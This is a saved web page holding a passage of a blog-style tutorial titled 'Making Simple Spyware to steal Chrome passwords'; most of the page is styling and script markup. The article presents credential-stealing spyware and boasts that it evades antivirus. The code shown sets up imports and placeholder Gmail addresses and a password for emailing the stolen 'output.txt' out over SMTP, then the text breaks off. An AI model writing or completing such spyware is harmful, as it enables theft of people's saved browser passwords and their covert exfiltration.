@@ -1,0 +1,2229 @@
+<!DOCTYPE html>
+<html lang="en" data-rh="lang">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script async="" src="./index_files/branch-latest.min.js.download"></script>
+    <script>!function (c, f) {
+        var t, o, i, e = [], r = {passive: !0, capture: !0}, n = new Date, a = "pointerup", u = "pointercancel";
+
+        function p(n, e) {
+            t || (t = e, o = n, i = new Date, w(f), s())
+        }
+
+        function s() {
+            0 <= o && o < i - n && (e.forEach(function (n) {
+                n(o, t)
+            }), e = [])
+        }
+
+        function l(n) {
+            if (n.cancelable) {
+                var e = (1e12 < n.timeStamp ? new Date : performance.now()) - n.timeStamp;
+                "pointerdown" == n.type ? function (n, e) {
+                    function t() {
+                        p(n, e), i()
+                    }
+
+                    function o() {
+                        i()
+                    }
+
+                    function i() {
+                        f(a, t, r), f(u, o, r)
+                    }
+
+                    c(a, t, r), c(u, o, r)
+                }(e, n) : p(e, n)
+            }
+        }
+
+        function w(e) {
+            ["click", "mousedown", "keydown", "touchstart", "pointerdown"].forEach(function (n) {
+                e(n, l, r)
+            })
+        }
+
+        w(c), self.perfMetrics = self.perfMetrics || {}, self.perfMetrics.onFirstInputDelay = function (n) {
+            e.push(n), s()
+        }
+    }(addEventListener, removeEventListener)</script>
+    <title>Making Simple Spyware to steal Chrome passwords - Ali Pardhan</title>
+    <meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+    <meta data-rh="true" name="theme-color" content="#000000">
+    <meta data-rh="true" property="og:type" content="article">
+    <meta data-rh="true" property="article:published_time" content="2019-08-08T03:45:36.805Z">
+    <meta data-rh="true" name="title" content="Making Simple Spyware to steal Chrome passwords - Ali Pardhan ">
+    <meta data-rh="true" property="og:title" content="Making Simple Spyware to steal Chrome passwords">
+    <meta data-rh="true" property="twitter:title" content="Making Simple Spyware to steal Chrome passwords">
+    <meta data-rh="true" name="description"
+          content="Using sqlite3 and win32crypt.CryptUnprotectData to select user data from the database. if you are wondering why to is so easy, you can read this, the inner workings of this function be read here…">
+    <meta data-rh="true" property="og:description"
+          content="chromePasswordThieve is an easy to develop program that is so elementary, that it  evades anti virus">
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="STATIC">html {
+        box-sizing: border-box
+    }
+
+    *, *:before, *:after {
+        box-sizing: inherit
+    }
+
+    body {
+        margin: 0;
+        padding: 0;
+        text-rendering: optimizeLegibility;
+        -webkit-font-smoothing: antialiased;
+        color: rgba(0, 0, 0, 0.8);
+        position: relative;
+        min-height: 100vh
+    }
+
+    h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form {
+        margin: 0
+    }
+
+    menu, ol, ul {
+        padding: 0;
+        list-style: none;
+        list-style-image: none
+    }
+
+    main {
+        display: block
+    }
+
+    a {
+        color: inherit;
+        text-decoration: none
+    }
+
+    a, button, input {
+        -webkit-tap-highlight-color: transparent
+    }
+
+    img, svg {
+        vertical-align: middle
+    }
+
+    button {
+        background: transparent;
+        overflow: visible
+    }
+
+    button, input, optgroup, select, textarea {
+        margin: 0
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="KEYFRAME">@-webkit-keyframes k1 {
+                                                                                     0% {
+                                                                                         transform: scale(1)
+                                                                                     }
+                                                                                     50% {
+                                                                                         transform: scale(1.1)
+                                                                                     }
+                                                                                     100% {
+                                                                                         transform: scale(1)
+                                                                                     }
+                                                                                 }
+
+    @-moz-keyframes k1 {
+        0% {
+            transform: scale(1)
+        }
+        50% {
+            transform: scale(1.1)
+        }
+        100% {
+            transform: scale(1)
+        }
+    }
+
+    @keyframes k1 {
+        0% {
+            transform: scale(1)
+        }
+        50% {
+            transform: scale(1.1)
+        }
+        100% {
+            transform: scale(1)
+        }
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE">.a {
+        font-family: medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif
+    }
+
+    .b {
+        font-weight: 400
+    }
+
+    .c {
+        background-color: rgba(255, 255, 255, 1)
+    }
+
+    .l {
+        display: block
+    }
+
+    .m {
+        position: fixed
+    }
+
+    .n {
+        top: 0
+    }
+
+    .o {
+        left: 0
+    }
+
+    .p {
+        right: 0
+    }
+
+    .q {
+        z-index: 500
+    }
+
+    .r {
+        box-shadow: 0 4px 12px 0 rgba(0, 0, 0, 0.05)
+    }
+
+    .s {
+        transition: transform 300ms ease
+    }
+
+    .t {
+        will-change: transform
+    }
+
+    .v {
+        margin-left: auto
+    }
+
+    .w {
+        margin-right: auto
+    }
+
+    .x {
+        width: 100%
+    }
+
+    .y {
+        box-sizing: border-box
+    }
+
+    .aq {
+        height: 65px
+    }
+
+    .ar {
+        display: flex
+    }
+
+    .as {
+        align-items: center
+    }
+
+    .av {
+        flex: 1 0 auto
+    }
+
+    .aw {
+        display: none
+    }
+
+    .ax {
+        fill: rgba(0, 0, 0, 0.84)
+    }
+
+    .ba {
+        flex: 0 0 auto
+    }
+
+    .bb {
+        font-family: medium-content-sans-serif-font, "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", Geneva, Arial, sans-serif
+    }
+
+    .bc {
+        font-style: normal
+    }
+
+    .bd {
+        line-height: 20px
+    }
+
+    .be {
+        font-size: 15.8px
+    }
+
+    .bf {
+        letter-spacing: 0px
+    }
+
+    .bg {
+        color: rgba(0, 0, 0, 0.54)
+    }
+
+    .bh {
+        fill: rgba(0, 0, 0, 0.54)
+    }
+
+    .bi {
+        justify-content: flex-end
+    }
+
+    .bj {
+        margin-right: 16px
+    }
+
+    .bl {
+        padding: 4px 12px
+    }
+
+    .bm {
+        color: rgba(0, 0, 0, 0.84)
+    }
+
+    .bn {
+        background: 0
+    }
+
+    .bo {
+        border-color: rgba(0, 0, 0, 0.54)
+    }
+
+    .bp:hover {
+        color: rgba(0, 0, 0, 0.97)
+    }
+
+    .bq:hover {
+        fill: rgba(0, 0, 0, 0.97)
+    }
+
+    .br:hover {
+        border-color: rgba(0, 0, 0, 0.84)
+    }
+
+    .bs:hover {
+        cursor: pointer
+    }
+
+    .bt:disabled {
+        color: rgba(0, 0, 0, 0.54)
+    }
+
+    .bu:disabled {
+        fill: rgba(0, 0, 0, 0.76)
+    }
+
+    .bv:disabled {
+        border-color: rgba(0, 0, 0, 0.2)
+    }
+
+    .bw:disabled {
+        cursor: inherit
+    }
+
+    .bx:disabled:hover {
+        color: rgba(0, 0, 0, 0.54)
+    }
+
+    .by:disabled:hover {
+        fill: rgba(0, 0, 0, 0.76)
+    }
+
+    .bz:disabled:hover {
+        border-color: rgba(0, 0, 0, 0.2)
+    }
+
+    .ca {
+        border-radius: 4px
+    }
+
+    .cb {
+        border-width: 1px
+    }
+
+    .cc {
+        border-style: solid
+    }
+
+    .cd {
+        display: inline-block
+    }
+
+    .ce {
+        text-decoration: none
+    }
+
+    .cf:focus {
+        outline: none
+    }
+
+    .cg {
+        padding-bottom: 10px
+    }
+
+    .ch {
+        padding-top: 10px
+    }
+
+    .ci {
+        color: inherit
+    }
+
+    .cj {
+        fill: inherit
+    }
+
+    .ck {
+        font-size: inherit
+    }
+
+    .cl {
+        border: inherit
+    }
+
+    .cm {
+        font-family: inherit
+    }
+
+    .cn {
+        letter-spacing: inherit
+    }
+
+    .co {
+        font-weight: inherit
+    }
+
+    .cp {
+        padding: 0
+    }
+
+    .cq {
+        margin: 0
+    }
+
+    .cr:hover {
+        color: rgba(0, 0, 0, 0.9)
+    }
+
+    .cs:hover {
+        fill: rgba(0, 0, 0, 0.9)
+    }
+
+    .ct:disabled {
+        cursor: default
+    }
+
+    .cu:disabled {
+        fill: rgba(0, 0, 0, 0.54)
+    }
+
+    .cv {
+        border-radius: 50%
+    }
+
+    .cw {
+        height: 32px
+    }
+
+    .cx {
+        width: 32px
+    }
+
+    .cy {
+        margin-bottom: 0px
+    }
+
+    .da {
+        padding-left: 24px
+    }
+
+    .db {
+        padding-right: 24px
+    }
+
+    .dc {
+        max-width: 728px
+    }
+
+    .dd {
+        flex-direction: column
+    }
+
+    .de {
+        border: 1px solid rgba(0, 0, 0, 0.2)
+    }
+
+    .df {
+        margin-top: 24px
+    }
+
+    .dg {
+        position: relative
+    }
+
+    .dh {
+        margin: 12px
+    }
+
+    .di {
+        position: absolute
+    }
+
+    .dj {
+        padding: 20px
+    }
+
+    .dk {
+        margin-bottom: 8px
+    }
+
+    .dl {
+        font-weight: 300
+    }
+
+    .dm {
+        font-size: 15px
+    }
+
+    .dn {
+        font-size: 16px
+    }
+
+    .do {
+        text-decoration: underline
+    }
+
+    .dp {
+        opacity: 0
+    }
+
+    .dq {
+        pointer-events: none
+    }
+
+    .dr {
+        will-change: opacity
+    }
+
+    .ds {
+        transition: opacity 200ms
+    }
+
+    .dt {
+        width: 131px
+    }
+
+    .du {
+        left: 50%
+    }
+
+    .dv {
+        transform: translateX(-516px)
+    }
+
+    .dw {
+        top: calc(65px + 54px + 40px)
+    }
+
+    .dx {
+        padding-top: 28px
+    }
+
+    .dy {
+        margin-bottom: 19px
+    }
+
+    .dz {
+        margin-left: -5px
+    }
+
+    .ea {
+        margin-right: 5px
+    }
+
+    .eb {
+        outline: 0
+    }
+
+    .ec {
+        border: 0
+    }
+
+    .ed {
+        user-select: none
+    }
+
+    .ee {
+        cursor: default
+    }
+
+    .ef > svg {
+        pointer-events: none
+    }
+
+    .eg:active {
+        border-style: none
+    }
+
+    .eh {
+        -webkit-user-select: none
+    }
+
+    .ei {
+        fill: rgba(0, 0, 0, 0.76)
+    }
+
+    .ej:focus {
+        fill: rgba(0, 0, 0, 0.54)
+    }
+
+    .ek:hover {
+        fill: rgba(0, 0, 0, 0.54)
+    }
+
+    .el {
+        opacity: 0.25
+    }
+
+    .em {
+        margin-top: 40px
+    }
+
+    .en {
+        clear: both
+    }
+
+    .eo {
+        justify-content: center
+    }
+
+    .eu {
+        max-width: 680px
+    }
+
+    .ev {
+        list-style-type: none
+    }
+
+    .ew {
+        margin-right: 8px
+    }
+
+    .ex {
+        border-radius: 3px
+    }
+
+    .ey {
+        padding: 5px 10px
+    }
+
+    .ez {
+        background: rgba(0, 0, 0, 0.05)
+    }
+
+    .fa {
+        line-height: 22px
+    }
+
+    .fb {
+        margin-top: 15px
+    }
+
+    .fc {
+        justify-content: space-between
+    }
+
+    .fd {
+        padding-right: 8px
+    }
+
+    .fe {
+        padding-top: 32px
+    }
+
+    .ff {
+        border-top: 1px solid rgba(0, 0, 0, 0.1)
+    }
+
+    .fg {
+        margin-bottom: 25px
+    }
+
+    .fh {
+        margin-top: 25px
+    }
+
+    .fi {
+        margin-bottom: 32px
+    }
+
+    .fj {
+        min-height: 80px
+    }
+
+    .fo {
+        height: 80px
+    }
+
+    .fp {
+        width: 80px
+    }
+
+    .fq {
+        padding-left: 102px
+    }
+
+    .fs {
+        text-transform: uppercase
+    }
+
+    .ft {
+        letter-spacing: 0.05em
+    }
+
+    .fu {
+        margin-bottom: 6px
+    }
+
+    .fv {
+        font-weight: 600
+    }
+
+    .fw {
+        font-size: 28px
+    }
+
+    .fx {
+        line-height: 36px
+    }
+
+    .fy {
+        max-width: 555px
+    }
+
+    .fz {
+        max-width: 450px
+    }
+
+    .ga {
+        font-size: 18px
+    }
+
+    .gb {
+        line-height: 24px
+    }
+
+    .gd {
+        padding-top: 25px
+    }
+
+    .ge {
+        border: 1px solid rgba(3, 168, 124, 1)
+    }
+
+    .gf {
+        text-align: center
+    }
+
+    .gg {
+        color: rgba(2, 158, 116, 1)
+    }
+
+    .gh {
+        margin-top: 64px
+    }
+
+    .gi {
+        background-color: rgba(0, 0, 0, 0.02)
+    }
+
+    .gj {
+        max-width: 1032px
+    }
+
+    .gk {
+        padding: 60px 0
+    }
+
+    .gl {
+        background-color: rgba(0, 0, 0, 0.9)
+    }
+
+    .gn {
+        padding-bottom: 48px
+    }
+
+    .go {
+        border-bottom: 1px solid rgba(255, 255, 255, 0.54)
+    }
+
+    .gp {
+        margin: 0 -12px
+    }
+
+    .gq {
+        margin: 0 12px
+    }
+
+    .gr {
+        flex: 1 1 0
+    }
+
+    .gs {
+        padding-bottom: 12px
+    }
+
+    .gt:hover {
+        color: rgba(255, 255, 255, 0.99)
+    }
+
+    .gu:hover {
+        fill: rgba(255, 255, 255, 0.99)
+    }
+
+    .gv:disabled {
+        color: rgba(255, 255, 255, 0.7)
+    }
+
+    .gw:disabled {
+        fill: rgba(255, 255, 255, 0.7)
+    }
+
+    .gx {
+        color: rgba(255, 255, 255, 0.98)
+    }
+
+    .gy {
+        fill: rgba(255, 255, 255, 0.98)
+    }
+
+    .gz {
+        text-align: inherit
+    }
+
+    .ha {
+        font-size: 21.6px
+    }
+
+    .hb {
+        letter-spacing: -0.32px
+    }
+
+    .hc {
+        color: rgba(255, 255, 255, 0.7)
+    }
+
+    .hd {
+        fill: rgba(255, 255, 255, 0.7)
+    }
+
+    .he {
+        padding-bottom: 8px
+    }
+
+    .hf {
+        padding-top: 8px
+    }
+
+    .hg {
+        width: 200px
+    }
+
+    .hi:hover {
+        text-decoration: underline
+    }
+
+    .hj {
+        margin-left: 16px
+    }
+
+    .hl {
+        margin: 15px 0
+    }
+
+    .hm {
+        top: calc(100vh + 100px)
+    }
+
+    .hn {
+        bottom: calc(100vh + 100px)
+    }
+
+    .ho {
+        width: 10px
+    }
+
+    .hp {
+        word-break: break-word
+    }
+
+    .hq {
+        word-wrap: break-word
+    }
+
+    .hr:after {
+        display: block
+    }
+
+    .hs:after {
+        content: ""
+    }
+
+    .ht:after {
+        clear: both
+    }
+
+    .hu {
+        margin: 0 auto
+    }
+
+    .hv {
+        line-height: 1.23
+    }
+
+    .hw {
+        letter-spacing: 0
+    }
+
+    .hx {
+        font-family: medium-content-title-font, Georgia, Cambria, "Times New Roman", Times, serif
+    }
+
+    .hy {
+        font-size: 40px
+    }
+
+    .ie {
+        margin-bottom: -0.27em
+    }
+
+    .if {
+        line-height: 48px
+    }
+
+    .ig {
+        margin-top: 32px
+    }
+
+    .ih {
+        height: 48px
+    }
+
+    .ii {
+        width: 48px
+    }
+
+    .ij {
+        margin-left: 12px
+    }
+
+    .ik {
+        margin-bottom: 2px
+    }
+
+    .im {
+        overflow: hidden
+    }
+
+    .in {
+        max-height: 20px
+    }
+
+    .io {
+        text-overflow: ellipsis
+    }
+
+    .ip {
+        display: -webkit-box
+    }
+
+    .iq {
+        -webkit-line-clamp: 1
+    }
+
+    .ir {
+        -webkit-box-orient: vertical
+    }
+
+    .is {
+        margin-left: 8px
+    }
+
+    .it {
+        box-shadow: inset 3px 0 0 0 rgba(0, 0, 0, 0.84)
+    }
+
+    .iu {
+        padding-left: 23px
+    }
+
+    .iv {
+        margin-left: -20px
+    }
+
+    .iw {
+        line-height: 1.58
+    }
+
+    .ix {
+        letter-spacing: -0.004em
+    }
+
+    .iy {
+        font-style: italic
+    }
+
+    .iz {
+        font-family: medium-content-serif-font, Georgia, Cambria, "Times New Roman", Times, serif
+    }
+
+    .jk {
+        margin-bottom: -0.46em
+    }
+
+    .jq {
+        max-width: 630px
+    }
+
+    .jr {
+        transition: opacity 100ms 400ms
+    }
+
+    .js {
+        height: 100%
+    }
+
+    .jt {
+        transform: translateZ(0)
+    }
+
+    .ju {
+        margin: auto
+    }
+
+    .jv {
+        background-color: rgba(0, 0, 0, 0.05)
+    }
+
+    .jw {
+        padding-bottom: 50.79365079365079%
+    }
+
+    .jx {
+        filter: blur(20px)
+    }
+
+    .jy {
+        transform: scale(1.1)
+    }
+
+    .jz {
+        background: rgba(255, 255, 255, 1)
+    }
+
+    .ka {
+        overflow-x: auto
+    }
+
+    .kb {
+        line-height: 1.18
+    }
+
+    .kc {
+        letter-spacing: -0.022em
+    }
+
+    .kd {
+        font-family: Menlo, Monaco, "Courier New", Courier, monospace
+    }
+
+    .ke {
+        margin-top: -0.09em
+    }
+
+    .kf {
+        margin-bottom: -0.09em
+    }
+
+    .kg {
+        white-space: pre-wrap
+    }
+
+    .km {
+        padding: 2px 4px
+    }
+
+    .kn {
+        font-size: 75%
+    }
+
+    .ko {
+        line-height: 1.12
+    }
+
+    .kz {
+        margin-bottom: -0.28em
+    }
+
+    .lk {
+        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1), inset 0 0 0 1px rgba(0, 0, 0, 0.1)
+    }
+
+    .ll {
+        max-height: 40px
+    }
+
+    .lm {
+        -webkit-line-clamp: 2
+    }
+
+    .ln {
+        padding: 0px
+    }
+
+    .lo {
+        padding: 16px 20px
+    }
+
+    .lp {
+        flex: 1 1 auto
+    }
+
+    .lr {
+        margin-top: 8px
+    }
+
+    .ls {
+        margin-top: 12px
+    }
+
+    .lt {
+        background-repeat: repeat-x
+    }
+
+    .lu {
+        background-image: linear-gradient(to right, rgba(0, 0, 0, 0.84) 100%, rgba(0, 0, 0, 0.84) 0);
+        background-image: url('data:image/svg+xml;utf8,<svg preserveAspectRatio="none" viewBox="0 0 1 1" xmlns="http://www.w3.org/2000/svg"><line x1="0" y1="0" x2="1" y2="1" stroke="rgba(0, 0, 0, 0.84)" /></svg>')
+    }
+
+    .lv {
+        background-size: 1px 1px
+    }
+
+    .lw {
+        background-position: 0 1.05em;
+        background-position: 0 calc(1em + 1px)
+    }
+
+    .lx {
+        width: 160px
+    }
+
+    .ly {
+        background-image: url(https://miro.medium.com/max/320/0*-nJLZ5AFEuJqMDOG)
+    }
+
+    .lz {
+        background-origin: border-box
+    }
+
+    .ma {
+        background-size: cover
+    }
+
+    .mb {
+        height: 167px
+    }
+
+    .mc {
+        background-position: 50% 50%
+    }
+
+    .md {
+        max-width: 100%
+    }
+
+    .me {
+        box-shadow: inset 0 0 0 1px rgba(0, 0, 0, 0.1)
+    }
+
+    .mf {
+        max-width: 696px
+    }
+
+    .mg {
+        padding-bottom: 54.88505747126437%
+    }
+
+    .mh {
+        font-weight: 700
+    }
+
+    .mi {
+        background-image: url(https://miro.medium.com/max/320/0*nhrAAP4lkCDVUWPX)
+    }
+
+    .mj {
+        background-image: url(https://miro.medium.com/freeze/max/320/1*gCg9S7_Piry9Zu2hJnERxA.gif)
+    }
+
+    .ms {
+        padding-bottom: 16.53543307086614%
+    }
+
+    .mt {
+        line-height: 1.4
+    }
+
+    .mu {
+        margin-top: 10px
+    }
+
+    .mw {
+        padding-bottom: 16.74418604651163%
+    }
+
+    .mx {
+        background-image: url(https://miro.medium.com/max/320/0*ydftgvEcjCFXnqeQ)
+    }
+
+    .my {
+        background-image: url(https://miro.medium.com/max/320/0*FkZ9mwRGDAKCi7wx)
+    }
+
+    .mz {
+        background-image: url(https://miro.medium.com/max/320/0*a_JdtiYusP-TZ9AV)
+    }
+
+    .na {
+        background-image: url(https://miro.medium.com/max/320/0*KjcC1CAMGgivlzJL)
+    }
+
+    .nl {
+        margin-bottom: -0.31em
+    }
+
+    .nm {
+        background-image: url(https://miro.medium.com/max/160/0*-nJLZ5AFEuJqMDOG)
+    }
+
+    .nn {
+        background-image: url(https://miro.medium.com/max/160/0*nhrAAP4lkCDVUWPX)
+    }
+
+    .no {
+        background-image: url(https://miro.medium.com/freeze/max/160/1*gCg9S7_Piry9Zu2hJnERxA.gif)
+    }
+
+    .np {
+        background-image: url(https://miro.medium.com/max/160/0*ydftgvEcjCFXnqeQ)
+    }
+
+    .nq {
+        background-image: url(https://miro.medium.com/max/160/0*FkZ9mwRGDAKCi7wx)
+    }
+
+    .nr {
+        background-image: url(https://miro.medium.com/max/160/0*a_JdtiYusP-TZ9AV)
+    }
+
+    .ns {
+        background-image: url(https://miro.medium.com/max/160/0*KjcC1CAMGgivlzJL)
+    }
+
+    .nt {
+        -webkit-user-select: none
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE" media="all and (min-width: 1080px)">.d {
+        display: none
+    }
+
+    .an {
+        padding-left: 24px
+    }
+
+    .ao {
+        padding-right: 24px
+    }
+
+    .ap {
+        max-width: 1080px
+    }
+
+    .et {
+        margin: 0 24px
+    }
+
+    .id {
+        margin-top: 0.78em
+    }
+
+    .ji {
+        font-size: 21px
+    }
+
+    .jj {
+        margin-top: 2em
+    }
+
+    .jp {
+        margin-top: 56px
+    }
+
+    .kl {
+        margin-top: 1.91em
+    }
+
+    .kx {
+        font-size: 34px
+    }
+
+    .ky {
+        margin-top: 1.95em
+    }
+
+    .le {
+        margin-top: 0.86em
+    }
+
+    .lj {
+        margin-top: 32px
+    }
+
+    .mr {
+        max-width: 1032px
+    }
+
+    .nj {
+        font-size: 26px
+    }
+
+    .nk {
+        margin-top: 1.72em
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e {
+        display: none
+    }
+
+    .ak {
+        padding-left: 24px
+    }
+
+    .al {
+        padding-right: 24px
+    }
+
+    .am {
+        max-width: 1080px
+    }
+
+    .mv {
+        text-align: center
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f {
+        display: none
+    }
+
+    .ah {
+        padding-left: 24px
+    }
+
+    .ai {
+        padding-right: 24px
+    }
+
+    .aj {
+        max-width: 904px
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g {
+        display: none
+    }
+
+    .ae {
+        padding-left: 24px
+    }
+
+    .af {
+        padding-right: 24px
+    }
+
+    .ag {
+        max-width: 728px
+    }
+
+    .at {
+        height: 56px
+    }
+
+    .au {
+        display: flex
+    }
+
+    .ay {
+        margin-left: -5px
+    }
+
+    .az {
+        display: block
+    }
+
+    .bk {
+        margin-right: 10px
+    }
+
+    .cz {
+        margin-bottom: 0px
+    }
+
+    .fk {
+        margin-bottom: 24px
+    }
+
+    .fl {
+        align-items: center
+    }
+
+    .fm {
+        width: 102px
+    }
+
+    .fn {
+        position: relative
+    }
+
+    .fr {
+        padding-left: 0
+    }
+
+    .gc {
+        margin-top: 24px
+    }
+
+    .gm {
+        padding: 32px 0
+    }
+
+    .hh {
+        width: 140px
+    }
+
+    .hk {
+        margin-left: 10px
+    }
+
+    .lq {
+        padding: 10px 12px 10px
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h {
+        display: none
+    }
+
+    .z {
+        padding-left: 24px
+    }
+
+    .ab {
+        padding-right: 24px
+    }
+
+    .ac {
+        max-width: 552px
+    }
+
+    .ep {
+        margin: 0 24px
+    }
+
+    .hz {
+        margin-top: 0.39em
+    }
+
+    .il {
+        margin-bottom: 0px
+    }
+
+    .ja {
+        font-size: 18px
+    }
+
+    .jb {
+        margin-top: 1.56em
+    }
+
+    .jl {
+        margin-top: 40px
+    }
+
+    .kh {
+        margin-top: 1.41em
+    }
+
+    .kp {
+        font-size: 30px
+    }
+
+    .kq {
+        margin-top: 1.2em
+    }
+
+    .la {
+        margin-top: 0.67em
+    }
+
+    .lf {
+        margin-top: 24px
+    }
+
+    .mk {
+        margin: 0
+    }
+
+    .ml {
+        max-width: 100%
+    }
+
+    .nb {
+        font-size: 24px
+    }
+
+    .nc {
+        margin-top: 1.23em
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE"
+           media="all and (min-width: 904px) and (max-width: 1079.98px)">.i {
+        display: none
+    }
+
+    .es {
+        margin: 0 24px
+    }
+
+    .ic {
+        margin-top: 0.78em
+    }
+
+    .jg {
+        font-size: 21px
+    }
+
+    .jh {
+        margin-top: 2em
+    }
+
+    .jo {
+        margin-top: 56px
+    }
+
+    .kk {
+        margin-top: 1.91em
+    }
+
+    .kv {
+        font-size: 34px
+    }
+
+    .kw {
+        margin-top: 1.95em
+    }
+
+    .ld {
+        margin-top: 0.86em
+    }
+
+    .li {
+        margin-top: 32px
+    }
+
+    .mq {
+        max-width: 1032px
+    }
+
+    .nh {
+        font-size: 26px
+    }
+
+    .ni {
+        margin-top: 1.72em
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE"
+           media="all and (min-width: 728px) and (max-width: 903.98px)">.j {
+        display: none
+    }
+
+    .er {
+        margin: 0 24px
+    }
+
+    .ib {
+        margin-top: 0.78em
+    }
+
+    .je {
+        font-size: 21px
+    }
+
+    .jf {
+        margin-top: 2em
+    }
+
+    .jn {
+        margin-top: 56px
+    }
+
+    .kj {
+        margin-top: 1.91em
+    }
+
+    .kt {
+        font-size: 34px
+    }
+
+    .ku {
+        margin-top: 1.95em
+    }
+
+    .lc {
+        margin-top: 0.86em
+    }
+
+    .lh {
+        margin-top: 32px
+    }
+
+    .mo {
+        margin: 0
+    }
+
+    .mp {
+        max-width: 100%
+    }
+
+    .nf {
+        font-size: 26px
+    }
+
+    .ng {
+        margin-top: 1.72em
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE"
+           media="all and (min-width: 552px) and (max-width: 727.98px)">.k {
+        display: none
+    }
+
+    .eq {
+        margin: 0 24px
+    }
+
+    .ia {
+        margin-top: 0.39em
+    }
+
+    .jc {
+        font-size: 18px
+    }
+
+    .jd {
+        margin-top: 1.56em
+    }
+
+    .jm {
+        margin-top: 40px
+    }
+
+    .ki {
+        margin-top: 1.41em
+    }
+
+    .kr {
+        font-size: 30px
+    }
+
+    .ks {
+        margin-top: 1.2em
+    }
+
+    .lb {
+        margin-top: 0.67em
+    }
+
+    .lg {
+        margin-top: 24px
+    }
+
+    .mm {
+        margin: 0
+    }
+
+    .mn {
+        max-width: 100%
+    }
+
+    .nd {
+        font-size: 24px
+    }
+
+    .ne {
+        margin-top: 1.23em
+    }</style>
+    <style type="text/css" data-fela-rehydration="375" data-fela-type="RULE" media="print">.u {
+        display: none
+    }</style>
+    <script charset="utf-8" src="./index_files/vendors_tracing.db265f32.chunk.js.download"></script>
+    <script charset="utf-8" src="./index_files/tracing.48bfc3d4.chunk.js.download"></script>
+    <script type="application/ld+json" data-rh="true">
+
+
+    </script>
+</head>
+<body>
+<div id="root">
+    <div class="a b c">
+        <div class="d e f g h i j k"></div>
+        <nav class="l m n o p c q r s t u" style="">
+            <div class="branch-journeys-top">
+                <section class="v w x y l z ab ac ae af ag ah ai aj ak al am an ao ap"></section>
+            </div>
+        </nav>
+        <div class="cy aq l cz at"></div>
+        <article>
+            <section class="da db v w x dc y ar dd"></section>
+            <span class="l"></span>
+            <div>
+                <div class="di o hm hn ho dq"></div>
+                <section class="hp hq hr hs ht">
+                    <div class="y hu x dc da db">
+                        <div>
+                            <div id="0151" class="hv hw bm bc hx b hy hz ia ib ic id ie"><h1 class="hx b hy if bm">
+                                Making Simple Spyware to steal Chrome passwords</h1></div>
+                            <div class="ig">
+                                <div class="as ar">
+                                    <div>
+                                        <a href=""><img
+                                                alt="Ali Pardhan" src="./index_files/0_dHRVY6xPltlmgNQG"
+                                                class="l cv ih ii" width="48" height="48"></a></div>
+                                    <div class="ij x l">
+                                        <div class="ar">
+                                            <div style="flex:1"><span class="bb b bc bd be bf l bm ax"><div
+                                                    class="ik ar as il" data-test-id="postByline"><span
+                                                    class="bb dl dn bd im in io ip iq ir bm"><a
+                                                    class="ci cj ck cl cm cn co cp cq bs hi cf ct bt cu"
+                                                    href="">Khizr Ali Pardhan</a></span><div
+                                                    class="is l ba h"></div></div></span></div>
+                                        </div>
+                                        <span class="bb b bc bd be bf l bg bh"><span
+                                                class="bb dl dn bd im in io ip iq ir bg"><div><a
+                                                class="ci cj ck cl cm cn co cp cq bs hi cf ct bt cu"
+                                                href="">Aug 7</a>
+                                            <!-- -->·<!-- --> <!-- -->5<!-- --> min read</div></span></span></div>
+                                </div>
+                            </div>
+                        </div>
+                        <blockquote class="it iu iv"><p id="1c36"
+                                                        class="iw ix bm iy iz b ja jb jc jd je jf jg jh ji jj jk"
+                                                        data-selectable-paragraph="">chromePasswordThieve is an easy to
+                            develop program that is so elementary, that it evades anti virus</p></blockquote>
+                        <figure class="jl jm jn jo jp en v w paragraph-image">
+                            <div class="v w jq">
+                                <div class="ju l dg jv">
+                                    <div class="jw l">
+                                        <div class="dp jr di n o js x im t jt"><img
+                                                src="./index_files/1_lbFvUcps1-_Y-IdO1tyQ7w.jpeg"
+                                                class="di n o js x jx jy" width="630" height="320"></div>
+                                        <img class="nu nv di n o js x jz" width="630" height="320"
+                                             src="./index_files/1_lbFvUcps1-_Y-IdO1tyQ7w(1).jpeg">
+                                        <noscript><img
+                                                src=""
+                                                class="di n o js x" width="630" height="320"/></noscript>
+                                    </div>
+                                </div>
+                            </div>
+                        </figure>
+                        <p id="00da" class="iw ix bm bc iz b ja jb jc jd je jf jg jh ji jj jk"
+                           data-selectable-paragraph="">We start by creating a file called <em class="iy">chromePasswordThieve.py </em>with
+                            the following imports and constants</p>
+                        <pre class="jl jm jn jo jp dj ez ka"><span id="4d82" class="kb kc bm bc kd b dn ke kf l kg"
+                                                                   data-selectable-paragraph="">import os<br>import os.path as op<br>import shutil<br>import smtplib<br>import win32crypt</span><span
+                                id="630c" class="kb kc bm bc kd b dn kh ki kj kk kl kf l kg"
+                                data-selectable-paragraph="">from email import encoders<br>from email.mime.base import MIMEBase<br>from email.mime.multipart import MIMEMultipart<br>from email.mime.text import MIMEText<br>from email.utils import formatdate<br>from shutil import copyfile<br>from sqlite3 import connect<br><br>FROM = "from@gmail.com" #source email<br>PASSWORD = "password"   #source email pasword  <br><br>TO = "to@gmail.com"     #destination email</span><span
+                                id="c5db" class="kb kc bm bc kd b dn kh ki kj kk kl kf l kg"
+                                data-selectable-paragraph="">SUBJECT = "data for chromePasswordThieve.py"<br><br>MESSAGE = """\<br><br>here is output.txt :) <br><br>"""<br></span></pre>
